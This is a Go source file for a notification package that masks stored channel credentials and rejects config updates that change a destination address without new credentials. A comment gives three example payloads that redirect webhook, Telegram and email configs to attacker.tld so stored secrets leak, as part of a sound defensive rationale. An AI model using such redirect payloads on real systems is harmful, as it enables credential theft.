package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes a
// credential it replaces the real content with a value carrying this prefix, and
// when the update API receives a value carrying this prefix it understands it as
// "keep the original value in the database unchanged".
//
// A prefix rather than an empty string or some fixed constant is used so that a
// bit of recognizable information can come along (see MaskedValue), letting the
// user tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original value too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as a hint
//
// Exposing only the last 6 characters is a deliberate choice: the recognizable
// part of a webhook address is at its end (e.g. WeCom's key, Feishu's bot id),
// while the prefix part is the same across bots and has no discriminative value.
// The last 6 characters are not enough to reconstruct the credential, but enough
// for the person who configured it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. echoed by the API and
// not modified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with the channel's credential
// fields replaced by masked values.
//
// An unknown channel kind returns an empty map instead of the original
// configuration — better to let the UI show "configuration unavailable" than to
// spit back raw content that may contain credentials when the channel kind
// cannot be recognized. Non-credential fields are kept as-is so the UI renders
// normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole:
		// judging sub-keys one by one would require every channel to declare yet
		// another set of "which sub-keys are credentials" rules, a complexity far
		// beyond the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address
// changed, but the caller did not take a position on the credential fields".
// Returning it instead of silently allowing or silently dropping credentials —
// see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly declared
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-fill the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or explicitly leave it empty to indicate the credential is no longer needed. " +
		"The original credential is only valid for the old address; continuing to use it amounts to handing it to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the
// security-sensitive case of "the destination address changed".
//
// It replaces a bare MergeConfig on the channel update path, addressing a
// verified feasible attack path: the destination address (where messages go) and
// the credentials (under which identity they are sent) are two independent sets
// of fields, and MergeConfig keeps the stored value for any "unmentioned key".
// So anyone who can PATCH a channel can **change only the address while saying
// nothing about the credentials**, and have the server send the stored real
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent, does not rely on redirects (so refusing
// cross-host redirects cannot stop it), and directly defeats the goal of this
// package's masking mechanism — "credentials are never echoed back to the
// browser".
//
// Rule: whenever a destination key is changed to a new value, the caller must
// take an explicit position on **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential
//     (clearing semantics preserved)
//   - pass back the masked value as-is / omit the key entirely → reject
//
// The third case is rejected too because the meaning of "masked value" is
// precisely "keep the old credential", and the old credential is only valid for
// the old address. Deliberately no "auto-drop credentials" here — for optional
// credential fields (webhook's headers, email's password) that would silently
// turn into "auth is gone but the API returned 200", which is harder to
// troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object) has
	// a masked literal embedded in it, the caller has stuffed the "keep original"
	// sentinel inside a structure. MergeConfig only recognizes "a string with the
	// prefix" as masked, and this shape would be stored as an ordinary object —
	// the literal "__masked__" really lands in the database, and authentication
	// silently fails afterwards with no error anywhere. Better to reject it.
	//
	// This check must come **first**: when the address has not changed there is
	// an early return, and placing it later would cover only the "address
	// changed" path (the first version got exactly this wrong, and the test
	// caught it right away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value counts
	// as "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: ordinary merge (masked values keep the original,
		// empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masking sentinel
// inside non-string structures.
//
// The masking mechanism rests on the premise that "the whole value is a string".
// Object fields like webhook's headers can only be masked as a whole (written as
// the string "__masked__") or submitted as a whole; stuffing the sentinel inside
// the object can neither express "keep unchanged" nor avoid being stored as a
// real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the masking marker %q: this field can only be left empty as a whole to keep the original, or submitted as a whole with a new value; embedding a masking placeholder inside a structure is not allowed",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two configuration values for equivalence. Comparing
// via JSON serialization also smooths over type differences — the frontend
// submits the port as a number while the database reads it back as float64, and
// a plain == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent"
// are the same state in this configuration model, because MergeConfig treats an
// empty string as an explicit clear and deletes the key outright. Without
// normalization, an always-empty optional destination field (Telegram's base_url
// is the only such field: empty means use the official address) would go down
// this path —
//
//	stored as base_url:"" at creation  →  first save: MergeConfig deletes the key
//	→ second save: incoming is "" while stored lacks the key, judged as "address changed"
//	→ credential is a masked value → 400 "destination address has changed, please re-fill the credential fields"
//
// and every save from then on fails unless the user re-pastes the Bot Token,
// even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a configuration value is "empty".
// The convention must agree with MergeConfig's clearing check
// (strings.TrimSpace(s) == ""), otherwise there is a crack where "MergeConfig
// thinks it should be deleted but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used to update channel
// configuration.
//
// Rules:
//   - keys whose incoming value is masked → keep the stored value (the user did
//     not change this field)
//   - keys whose incoming value is an empty string → treated as an explicit
//     clear, the key is deleted
//   - all other keys → overwritten with the incoming value
//   - keys present in stored but absent from incoming → kept (partial update
//     semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend
// form submits unfilled fields as empty strings, and writing them in as valid
// values would really clear the "leave empty to keep the original" fields. The
// choice here is explicit clearing, because the user has no other way to express
// removing a misconfigured field (dragging the field away could distinguish "not
// provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
